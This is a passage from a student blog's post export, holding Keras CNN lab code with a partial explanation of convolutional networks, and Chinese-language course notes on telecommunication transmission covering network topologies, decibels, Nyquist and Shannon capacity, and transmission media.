class=\"code\"><pre><span class=\"line\">plt.plot(h.history[<span class=\"string\">&#x27;loss&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\">#plt.plot(h.history[&#x27;val_loss&#x27;])</span></span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;model loss&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;loss&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;epoch&#x27;</span>)</span><br><span class=\"line\">plt.legend([<span class=\"string\">&#x27;train&#x27;</span>, <span class=\"string\">&#x27;val&#x27;</span>], loc=<span class=\"string\">&#x27;upper left&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p>image:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%207.42.45%20PM.png\" alt=\"Screen Shot 2023-03-01 at 7.42.45 PM\"></p>\n<h3><span id=\"predictampevaluate\">predict&amp;evaluate</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\">pred = model.predict(test_data)</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\">pred=np.argmax(pred,axis=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#np.argmax can returns the indices of the maximum values along an axis. A DataFrame object has two axes: “axis 0” and “axis 1”. “axis 0” represents rows and “axis 1” represents columns</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%208.08.53%20PM.png\" alt=\"Screen Shot 2023-03-01 at 8.08.53 PM\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> confusion_matrix</span><br><span class=\"line\">cm = confusion_matrix(test_data.classes, pred)</span><br><span class=\"line\">sns.heatmap(cm, annot=<span class=\"literal\">True</span>)</span><br><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\"><span class=\"built_in\">print</span>((cm[<span class=\"number\">0</span>,<span class=\"number\">0</span>]+cm[<span class=\"number\">1</span>,<span class=\"number\">1</span>])/(<span class=\"built_in\">sum</span>(<span class=\"built_in\">sum</span>(cm))))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%208.34.14%20PM.png\" alt=\"Screen Shot 2023-03-01 at 8.34.14 PM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%208.35.09%20PM.png\" alt=\"Screen Shot 2023-03-01 at 8.35.09 PM\"></p>\n<h2><span id=\"4-conclusion\">4:    conclusion</span></h2><ol>\n<li>use imagegenerate() and Conv2D to obtain different training datas.</li>\n<li>use sequential model to train such datas.</li>\n<li>use spleen.metric to evaluate the training outcome.</li>\n</ol>\n","categories":["ML"],"tags":["ai_lab"]},{"title":"CNN elaboration","url":"/2023/03/06/ai_lab_note_002/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-MlFTAofe\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"0-preface\">0) preface</span></h2><p>So at the last article we introduced how to use the python package <code>keras</code> to achieve the realization of the CNN, and  now we can immerse to explore the basic principle of CNN, the convolutional neural network.</p>\n<p>Extra:The article based on some of the prominent blogs in chinese SNS, my honor to meet them.</p>\n<h2><span id=\"1-basic-idea-of-cnn\">1) basic idea of CNN</span></h2><h3><span id=\"why-cnn\">WHY CNN</span></h3><h4><span id=\"from-fully-connection-layers-perception-to-convolutions\">from fully connection layers perception to convolutions</span></h4><p>In the past ,the traditional photo digitalization technology faces a series of difficulties.</p>\n<p>1) When processing the picture through machine learning, it is a arduous procedue to analyze with a enormous amount of pixels in just a simple photo.</p>\n<ol>\n<li>The traditional way of simplely sampling at specific point can’t retain the features of the photo.</li>\n</ol>\n<p>And without doubt, CNN can solve this problem perfectly.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-07%20at%204.47.28%20PM.png\" alt=\"Screen Shot 2023-03-07 at 4.47.28 PM\"></p>\n<p>The photo above demostrates a traditinal multi layter perception with full connected layer, the conception somewhat likes the communication network of the mesh structure — if any additional input node is required, the  total cost will be dramastically increased. </p>\n<h3><span id=\"how-cnn\">HOW CNN</span></h3><p>Inspirated by some research within the filed of physical , we gain the basic principle of CNN—imitating the human visual system to identify the different layers with gradually complicated featrues.</p>\n<p><img src=\"https://easyai.tech/wp-content/uploads/2022/08/d447a-2019-06-19-renlei-shijue2.jpg\" alt=\"人类视觉原理2\"></p>\n<h3><span id=\"realization-of-cnn\">REALIZATION OF CNN</span></h3><p>Typical CNN consisted of 3 components.</p>\n<ol>\n<li>convolution layer — extract the featrues of the photo.</li>\n<li>pooling layer — decrease the magnitude of parameters.</li>\n<li>fully connected layer — output the outcome.</li>\n</ol>\n<h4><span id=\"convolution-layer\">convolution layer</span></h4><p><strong>description: using convolutional kernels to scan the photo to extract the features.</strong></p>\n<p>tbc</p>\n<h2><span id=\"reference\">*)Reference</span></h2><p><a href=\"https://d2l.ai/chapter_convolutional-neural-networks/why-conv.html\">https://d2l.ai/chapter_convolutional-neural-networks/why-conv.html</a></p>\n<p><a href=\"https://www.bilibili.com/video/av28733156/?p=3&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564\">https://www.bilibili.com/video/av28733156/?p=3&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564</a></p>\n<p><a href=\"https://easyai.tech/ai-definition/cnn/\">https://easyai.tech/ai-definition/cnn/</a></p>\n<p><a href=\"https://en.wikipedia.org/wiki/Convolutional_neural_network\">https://en.wikipedia.org/wiki/Convolutional_neural_network</a></p>\n","categories":["ML"],"tags":["ai_lab"]},{"title":"chapter 1 ： 电信传输的基本概念","url":"/2023/05/29/chapter%201%20%EF%BC%9A%20%E7%94%B5%E4%BF%A1%E4%BC%A0%E8%BE%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-rnjCWTIG\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>ppt 大纲</p>\n<h1><span id=\"11-电信是什么\">1.1  电信是什么</span></h1><p>简单版：长距离下的信号传输<br><strong>the transmission of signals over long distance</strong><br>复杂版：<br>Telecommunication encompasses the electrical communication at a distance of voice, data, and image information</p>\n<p>拓展：</p>\n<p>抽象为两个问题：</p>\n<pre><code>1. 指定信号，如何选传输媒介\n2. 指定传输媒介，如何选信号\n</code></pre><p>How to categorize these transmission media from different perspectives?</p>\n<ol>\n<li>金属线or非金属线</li>\n<li>guided or unguided</li>\n</ol>\n<h1><span id=\"12-传输模型\">1.2 传输模型</span></h1><h2><span id=\"完整的模型\">完整的模型</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.14.18%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.14.18 PM\"></p>\n<p>p6: 分别介绍该模型中的五个模块<br>p7-p11: 介绍传输过程中需要考虑的问题</p>\n<h2><span id=\"简化的模型17\">简化的模型（1.7 ）</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.50.50%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.50.50 PM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.51.30%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.51.30 PM\"><br>为什么放在1.7，主要是要抽象这些网络模块，然后接着算每一个网络的增益或者衰减，1.8就是算dB，所以说这ppt真的做得垃圾。</p>\n<h1><span id=\"13-信息的传输\">1.3 信息的传输</span></h1><p>p12-p15 一堆废话。</p>\n<p>Key Points:</p>\n<ol>\n<li>The <strong>foundational element</strong> of any communication facility is the transmission line.</li>\n<li>A business manager’s primary concern with these facilities is ensuring they provide <strong>necessary capacity,</strong> acceptable reliability, and minimum cost, rather than the technicalities of information encoding and transmission.</li>\n<li>Managers should have a basic understanding of transmission technology for informed decision-making.</li>\n<li>The choice of transmission medium, whether for use within the business or for long-distance communications, is a significant decision a business user has to make.</li>\n<li>Changes in technology, specifically fiber optic transmission and wireless transmission (like satellite and radio), are driving the evolution of data communications transmission.</li>\n<li>Fiber optic channels are growing in capacity and are becoming more affordable, making them an increasingly popular choice for long-distance communications and within office buildings due to their high capacity and security features.</li>\n<li>Switching is becoming a bottleneck issue in communications, leading to changes in communications architecture, including ATM switching, highly parallel processing in switches, and integrated network management schemes.</li>\n<li>Despite the decrease in cost and increase in capacity, transmission services remain the most costly component of a communications budget for most businesses.</li>\n<li>Managers need to be aware of techniques that increase the use efficiency of these facilities, specifically multiplexing (allowing multiple devices to share a transmission facility) and compression (reducing data size to use lower-capacity, cheaper transmission facilities).</li>\n<li>Understanding these technologies is crucial for managers to assess the appropriateness and cost-effectiveness of the different products in the market.</li>\n</ol>\n<p>没啥用，最关键的就是首先要保证传输的有效性。</p>\n<h1><span id=\"14-传输网络\">1.4 传输网络</span></h1><h2><span id=\"基本\">基本</span></h2><h3><span id=\"网状mesh-network\">网状（mesh network）</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.26.20%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.26.20 PM\"><br>网状保证每个节点的互联，稳定性maxmax。但是新节点增加的成本过大，belike 全连接神经网络。</p>\n<h3><span id=\"星型star-network\">星型（star network）</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.26.30%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.26.30 PM\"></p>\n<p>减少了增加新节点的成本，降低单一节点稳定性。<br>官方术语：It is probably the least survivable. However, it is one of the most economic nodal patterns both to install and to administer.</p>\n<h2><span id=\"变形\">变形</span></h2><p>任何高级的网络架构都是基star和mesh的变形</p>\n<h3><span id=\"多级网络multiple-star-network-or-high-order-network\">多级网络（multiple-star network or high-order network）</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.27.39%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.27.39 PM\"><br>骨干网络+分支网络。优先保证主干网络的有效性。</p>\n<h3><span id=\"hierarchical-network-层级网络\">hierarchical network（。。层级网络？）</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-05-29%20at%208.34.28%20PM.png\" alt=\"Screen Shot 2023-05-29 at 8.34.28 PM\"><br>太长不看：<br>在典型的层级网络中，根据流量强度，可能建立高使用率（HU）路线，无论其层级。高使用率路线与直接路线相同。<br>本地区讨论通常使用“直接路线”，而长途或收费网络讨论则使用“高使用率路线”。<br>层级路由系统简化了交换机设计。当涉及层级路由和多星配置时，较低级别的交换机会依赖较高级别的交换机。如果呼叫目标是链中较低级别的交换机，则呼叫会沿链向下；如果目标是链外的交换机，则会沿链向上并穿过。存在高使用率路线时，呼叫可能会通过额外或补充的路线，前往远程中心，然后到达目的地。</p>\n<h1><span id=\"15-qos-服务质量\">1.5 QoS 服务质量</span></h1><p>服务质量（quality of service）</p>\n<p>QoS（Quality of Service）是服务质量的简称，表征了用户(subscriber)对服务提供商(provider/operator)所提供的服务的满意程度。<br>在通信网中，最早用户对于业务的种类需求并不多，只关心通话质量，因此早期的QoS可以通过声音的响度和清晰度进行反映。其后，随着用户数量的增多，QoS考虑了传输时延（通常以50ms作为快慢的区分）如今随着业务种类的增多，QoS的反应指标也相应的越来越多。<br>通常QoS的关键指标有：可用性、吞吐量、时延、丢包率等。 </p>\n<h1><span id=\"16-传输的定义\">1.6 传输的定义</span></h1><p>电信传输可以被拆分为两个独立的领域：</p>\n<h3><span id=\"switching\">switching</span></h3><p>Switching allows us to select and direct our communication to a specific user or family of users</p>\n<h3><span id=\"transmission\">transmission</span></h3><p>Transmission deals with the delivery of that signal in some fashion where the signal quality is acceptable to the far-end recipient. The two key words here are delivery and quality<br>信号的搬移</p>\n<h1><span id=\"18-算db\">1.8 算dB</span></h1><h2><span id=\"基本概念\">基本概念</span></h2><p>用电平来描述传输信号中的能量。</p>\n<pre><code>- 传输系统中大多数能量关系（比如发送与接收）都是非线性的。 \n- 采用电平值可以使传输系统中大量的非线性运算转换为线性运算。 \n</code></pre><p>dB则用来描述相对电平。</p>\n<h3><span id=\"分贝\">分贝</span></h3><h4><span id=\"相对\">相对</span></h4><script type=\"math/tex; mode=display\">\nP_{dB}  =10lg(\\frac{P}{P_{r}})</script><h4><span id=\"绝对\">绝对</span></h4><p>用1W或者1mW为上个公示中$P_{r}$的值，出来的值单位分别为dBW（可以直接简写为dB）以及dBm。</p>\n<h3><span id=\"奈培\">奈培</span></h3><p>把分贝的底数换成e，即</p>\n<script type=\"math/tex; mode=display\">\nlg(x) \\to \\ln(x)</script><h2><span id=\"计算例题\">计算例题</span></h2><h3><span id=\"常见速记值\">常见速记值</span></h3><p>两倍： 3dB<br>10的指数：$10^1$-&gt;10dB $10^2$ -&gt; 20dB 以此类推$10^3$ -&gt; 30dB </p>\n<h3><span id=\"系统的绝对电平和\">系统的绝对电平和</span></h3><h4><span id=\"级联串联\">级联（串联）</span></h4><p>分贝值直接相加</p>\n<h4><span id=\"并联\">并联</span></h4><p>分贝值先换算成W，再计算。</p>\n","categories":["EE"],"tags":["电信传输"]},{"title":"chapter 2 ：数据传输","url":"/2023/05/29/chapter%202%20%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<p>对于又臭又长的ppt以及bnh上课内容（依靠我仅存的抽象笔记）的关键提取</p>\n<p>部分内容多参照gpt3.5+gpt4以及[<a href=\"https://l61012345.top/2022/06/08/学习笔记/传输线/知识点整理/#时延失真-色散]），存在一定hallucination但是概率不是特别大。\">https://l61012345.top/2022/06/08/学习笔记/传输线/知识点整理/#时延失真-色散]），存在一定hallucination但是概率不是特别大。</a></p>\n<h1><span id=\"key-points\">key points</span></h1><p>两面ppt（3-4）<br>整个ppt内容分为四个部分；</p>\n<ol>\n<li>任何信息都由信号传递</li>\n<li>信号为频率的组合，衡量频率的关键参数是带宽</li>\n<li>传输设备中主要考虑的问题是传输损耗，尤其是衰减。</li>\n<li>设计传输设备时需要注意四个点：信号带宽、数据率、噪声、错误等级。</li>\n</ol>\n<h1><span id=\"21-传输中的术语\">2.1 传输中的术语</span></h1><h3><span id=\"211-guided-or-unguided\">2.1.1 guided or unguided</span></h3><p>可以简单地理解为有线or无线。</p>\n<h4><span id=\"2111-guided\">2.1.1.1 guided</span></h4><p>有线传输</p>\n<h5><span id=\"1point2point\">1）point2point</span></h5><p>点对点，即direct link在guided传输下的体现</p>\n<h5><span id=\"2multipoint\">2）multipoint</span></h5><p>多对一，两个设备以上的媒体共享同一个设备。</p>\n<h4><span id=\"2112-direct-link\">2.1.1.2 direct link</span></h4><p>两个终端互相传输，不存在中间设备。无论guided或unguided都可以使用direct link。</p>\n<h4><span id=\"2113-unguided\">2.1.1.3 unguided</span></h4><p>无线传输</p>\n<h4><span id=\"2114\">2.1.1.4</span></h4><h5><span id=\"1-simplex\">1） simplex</span></h5><p>任何时间内信号只沿一个方向传递，i.e：固定A终端发B终端收</p>\n<h5><span id=\"2-half-duplex\">2） half-duplex</span></h5><p>同一时间内信号只沿一个方向传递，但不同时间内方向可以颠倒。i.e：t1 A发B收，t2B发A收</p>\n<h5><span id=\"3-full-duplex\">3） full-duplex</span></h5><p>任何时间内终端都可以同时收发信息。</p>\n<h3><span id=\"212-带宽-频谱-频率\">2.1.2 带宽 频谱 频率</span></h3><p>信号延伸的整个频谱范围为绝对带宽，能量集中的范围为相对带宽。<br>根据香农公示及奈奎斯特采样定理可推出带宽越大，该系统的传输的数据率越大。</p>\n<h1><span id=\"22-模拟amp数字信号传输\">2.2 模拟&amp;数字信号传输</span></h1><p>注意区分传输与信号，belike 模拟传输不等于模拟信号传输</p>\n<h2><span id=\"220-模拟amp数字信号\">2.2.0 模拟&amp;数字信号</span></h2><p>没啥好说的，注意几个点：</p>\n<ol>\n<li>数字信号无法在非导向传输媒介中传输，传输成本便宜，但更容易受到衰减和噪声的影响（因为噪声可能会将0干扰为1或1干扰为0）</li>\n<li>由于数字信号更容易受到影响，因此只适合进行短距离传播，所以需要使用转发器。</li>\n</ol>\n<p>此外，bnh多次强调要记一下语音信号的频率在300-3400Hz。。。</p>\n<h2><span id=\"221-数字传输\">2.2.1 数字传输</span></h2><p>几个特点：</p>\n<ol>\n<li>数字传输只传输比特流（二进制）。</li>\n<li>由于前文提到的数字传输容易受干扰，所以通常只能传输较短距离。为了使距离增加，需要加入repeaters，用来对信号检测及再生。</li>\n</ol>\n<h2><span id=\"222-模拟传输\">2.2.2 模拟传输</span></h2><p>ppt主要讲了三个特点：</p>\n<ol>\n<li>模拟传输不关心数据的类型（是数字信号or模拟信号）</li>\n<li>模拟传输会收受到衰减的影响，因此需要在系统中通过放大器增强信号，然而放大器同时也会增强噪声。</li>\n<li>虽然放大器对信号和噪声多次放大，但总的来说模拟传输对干扰的抵抗力比较好，数据还是能保持较好的可读性。（数字传输则反之）</li>\n<li>如果模拟传输的是数字信号，也可以在系统中加入repeaters，代替放大器，获得更加干净的信号。</li>\n</ol>\n<h2><span id=\"223-总结\">2.2.3 总结</span></h2><p>主要讲了模拟和数字传输的特点，最后一张ppt说大部分的电信设备都是基于数字传输，由于以下几个特点：</p>\n<ol>\n<li>科技进步，数字传输越来越便宜好用</li>\n<li>用repeaters，保证数据完整。</li>\n<li>多路复用，高效高容量</li>\n<li>提高安全和隐私</li>\n</ol>\n<h1><span id=\"23-传输损耗\">2.3 传输损耗</span></h1><h2><span id=\"230\">2.3.0</span></h2><p>传输损耗主要有</p>\n<ol>\n<li>衰减</li>\n<li>失真</li>\n<li>噪声</li>\n</ol>\n<h2><span id=\"231-衰减\">2.3.1 衰减</span></h2><p>对于导向传输，衰减通常可以被视作为一个与距离成正比的数，但对于非导向传输，衰减的计算相对复杂得多。</p>\n<h3><span id=\"导致的问题\">导致的问题</span></h3><p>由于衰减的存在，在设计传输系统时必要要考虑如下三个问题：</p>\n<ol>\n<li>保证信号能够传输足够长。</li>\n<li>保证信号在接受时有足够的能量以被检测到。</li>\n<li>衰减是随着频率变化的，因此要考虑到信号的频率对衰减的影响。</li>\n</ol>\n<h3><span id=\"解决方式\">解决方式</span></h3><p>针对三个问题列出对应的解决方案：<br>1和2都可以通过每隔一段特定距离后设置repeaters或放大器来解决，但是需要注意生成的信号不能太小也不能太大，太大会导致接收到的信号失真。<br>问题3对于模拟信号尤为显著，因为模拟信号的频率不同。解决的方法是equalizing attenuation across a band of frequencies，额。均分带宽频率的衰减。举例：对于电话线，加载线圈从而改变线路的电性质，使衰减变得平滑。或者利用放大器，更多地放大高频而不是低频。</p>\n<h3><span id=\"衰减量化\">衰减量化</span></h3><p>相对衰减值：<br>以1000Hz时的功率为参照。</p>\n<script type=\"math/tex; mode=display\">\nN_{f} = -10lg\\frac{P_{f}}{P_{1000}}</script><h2><span id=\"232-失真时延失真\">2.3.2 失真（时延失真）</span></h2><p>时延失真(delay distortion)是由于<strong>导向媒体信号传播群速度随着频率的不同而改变</strong>。对频带有限的信号而言，靠近中心频率的地方传播速度更快。不同频率的信号到达接收机的时间不同，从而产生不同频率信号的相移。<br>时延失真会导致码间串扰，是传输容量受限的主要因素。<br>均衡技术的使用可以减小时延失真。 </p>\n<h2><span id=\"233-噪声\">2.3.3 噪声</span></h2><p>主要分为</p>\n<ol>\n<li>热噪声(thermal noise)</li>\n<li>互调噪声(intermodulation noise)</li>\n<li>码间串扰(crosstalk)</li>\n<li>脉冲噪声(impluse noise)</li>\n</ol>\n<p>以上噪声的不可控程度随顺序逐步增大（即impulse noise最不可控）</p>\n<h3><span id=\"2331-热噪声\">2.3.3.1 热噪声</span></h3><p>可以视为白噪声。</p>\n<h5><span id=\"量化\">量化</span></h5><script type=\"math/tex; mode=display\">\nN = kTB</script><p>k 为常量<br>T为开尔文温度<br>B为带宽</p>\n<h3><span id=\"2332-intermodulation-noise\">2.3.3.2 intermodulation noise</span></h3><h4><span id=\"定义\">定义</span></h4><p>互调噪声发生在不同频率的信号共享同一传输媒体时。不同频率的信号通过同一非线性传输元件（如放大器等）所产生的信号叠加可能对其他工作频率产生影响。</p>\n<h3><span id=\"2333-crosstalk\">2.3.3.3 crosstalk</span></h3><p>相邻传输线发生电耦合，使得相邻传输线之间相互干扰产生的噪声。</p>\n<h3><span id=\"2334-impluse-noise\">2.3.3.4 impluse noise</span></h3><ul>\n<li>一种非连续的噪声，由不规则的脉冲或者持续时间短而振幅大的噪声尖峰组成。<br>  在数字通信中，<strong>冲激噪声是差错的主要起因</strong>。</li>\n</ul>\n<h1><span id=\"24-频道容量\">2.4 频道容量</span></h1><h2><span id=\"241-概述\">2.4.1 概述</span></h2><p>定义：频道可以传输的最大数据率。</p>\n<p>频道容量与以下四个术语相关：（<strong>bnh建议在脑子里有清晰的定义，我的评价是记不了吃亏记不了上当，但信bnh你就输了</strong>）</p>\n<p>data rate：比特率<br>Bandwidth：额，传输信号被transmitter和传输媒介限制的带宽<br>Noise：信道平均噪声<br>Error rate：发生错误的比率</p>\n<p>虽然带宽越大越好，但是大带宽的设备贵，所以俺们的目的是对于给定带宽，做到错误率越低，比特率越高，然后阻挠俺们实现目的的一个关键因素就是噪声。</p>\n<h2><span id=\"242-奈奎斯特带宽-香浓公示大集合\">2.4.2 奈奎斯特带宽 + 香浓公示大集合</span></h2><h3><span id=\"奈奎斯特带宽\">奈奎斯特带宽</span></h3><p>通信原理也学过了。简单来说就是保证不发生码间干扰的最小采样频率，就是两倍带宽。<br>简单粗暴地记忆<br>奈奎斯特带宽就是两倍的信号带宽。<br>有了奈奎斯特带宽，就有了一个奈奎斯特公式，用于计算<strong>离散</strong>信号传输的最大数据传输速率。根据奈奎斯特公式，最大传输速率（R）等于信道带宽（B）乘以每个信号样本可以表示的离散级数（N），即：</p>\n<script type=\"math/tex; mode=display\">\nR = 2B log2(N)</script><p>其中，B表示信道的带宽，N表示每个样本可以表示的离散级数（通常为2的幂次方）。奈奎斯特公式表明，增加信道带宽和每个样本可表示的离散级数都能提高传输速率。然而，实际传输速率可能会受到噪声、干扰和信号调制等因素的限制。（generated by gpt3.5）<br>之前我们将频道容量定义为可以传输的最大数据率，因此该s公式又能够改写为：</p>\n<script type=\"math/tex; mode=display\">\nC = 2B log2(M)</script><p>即ppt中展现的形式。</p>\n<h4><span id=\"例\">例</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-06-03%20at%2010.51.25%20AM.png\" alt=\"Screen Shot 2023-06-03 at 10.51.25 AM\"><br>就是把B= 3100hz，M=8代入上面的公式。<br>很显然，奈奎斯特公式揭示了当其他条件不变时，增加带宽就能够增加频道容量，但是之前有说到过噪声等因素同样会影响频道容量，于是下面就介绍了香农公式。</p>\n<h3><span id=\"香农公式\">香农公式</span></h3><p>香农公式主要通过引入信噪比来建立频道容量与噪声的关系。</p>\n<script type=\"math/tex; mode=display\">\nSNR_{dB} = 10lg \\frac{Signal \\  power}{Noise \\  Power}</script><p>香农公式：<br>（此处snr不是分贝值）</p>\n<script type=\"math/tex; mode=display\">\nC = B\\log_{2}(1+SNR)</script><h3><span id=\"香农奈奎斯特\">香农+奈奎斯特</span></h3><p>可以看到两个公式都是用来计算频道容量，但是存在区别：</p>\n<ol>\n<li>奈奎斯特公式用于计算离散信号频道容量，而香农公式用于计算信道容量（大部分情况下）</li>\n<li>通常情况下香农公式计算出来的频道容量是一个频道所能容纳的最大最理想的比特率，而奈奎斯特公式基于对连续信号采样出的离散信号，且不考虑信噪比，计算出的值通常小于香农公式。</li>\n<li>总的来说两个公式是完全不同场景下的应用，基本题目要给的话条件还是分得很清楚。<h4><span id=\"例\">例</span></h4><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-06-03%20at%2011.08.14%20AM.png\" alt=\"Screen Shot 2023-06-03 at 11.08.14 AM\"></li>\n</ol>\n<p>可以看到这个例子也是先用香农公式给频道算了容量，因为通常情况下，我们是根据指定的频道带宽来选择信号带宽。<br>所以这里也是同理，首先指定频道带宽，于是根据香农公式算出理想情况下的频道容量。<br>然后根据奈奎斯特公式，在满足最小采样频率的条件下算出能到达理想容量的离散级数。<br>（离散级数就是一个采样点能表示的离散值的数量，例如二进制一个采样点只能表示0或者1，所以离散级数是2）</p>\n<h2><span id=\"243-总结\">2.4.3 总结</span></h2><p>还记得四个bnh亲点的“术语”吗/<br>带宽，数据率，噪声，错误率。<br>将四个术语关联起来就是，我们想要提高频道的容量，即频道传输的最大数据率，决定因素有带宽和噪声，其中带宽是频道传输容量的基础，而噪声影响了错误率。同时因为带宽越大噪声越大，从而错误率也越大，所以在设计传输系统时需要考虑各个参数的平衡。</p>\n","categories":["EE"],"tags":["电信传输"]},{"title":"chapter 3：传输媒介","url":"/2023/06/01/chapter%203%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%AA%92%E4%BB%8B/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<p>本章关键：<br>了解常见金属传输线以及天线的性质。能够说出不同传输线的传输特征以及适合被传输的信号类型。<br>ps：我<strong>尽量</strong>将ppt和bnh的拓展（meiyong）内容分开写，避免分不主次。</p>\n<h1><span id=\"31-导向传输媒介\">3.1 导向传输媒介</span></h1><p>主要介绍常见的有线传输媒介，包括同轴线，双绞线以及光纤。<br>首先开篇放了一个频率表，给每个频段的信号取了个名字，没啥大作用，我看名字起得也挺随意，意思不大。<br>然后给出一张几种传输线的传输特性：<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-06-04%20at%205.33.59%20PM.png\" alt=\"Screen Shot 2023-06-04 at 5.33.59 PM\"><br>我只截了前面个一个频率范围，因为这个东西在大作业里出现了，不过不用记得太精确，大致知道哪个适合高频哪个适合低频就行。<br>p6的三种线的图表不用深究（尤其光纤），后面还会出现的。<br>下面就是依次详细介绍线了。</p>\n<h2><span id=\"311-双绞线\">3.1.1 双绞线</span></h2><h3><span id=\"3111-太长不看\">3.1.1.1 太长不看</span></h3><ol>\n<li>比同轴线便宜（为什么这么说，因为这俩经常拿来比）【（曾经最便宜，但不如光纤】</li>\n<li>适合低频。（3.5khz 以下）</li>\n<li>物理特征：两条平行双导线拧合。</li>\n</ol>\n<h3><span id=\"3112-太长爱看不看\">3.1.1.2 太长，爱看不看</span></h3><p>混杂一些bnh的科普，我也不知道有没有用，这个b酱东西总能把主次混杂搞得人分不清重点。</p>\n<h4><span id=\"物理特征\">物理特征</span></h4><p>两条绝缘铜线拧合。<br>官方说法：A twisted pair consists of two insulated copper wires arranged <strong>in a regular spiral pattern</strong>.（这个英文表达挺学术的，建议背一下（）</p>\n<h5><span 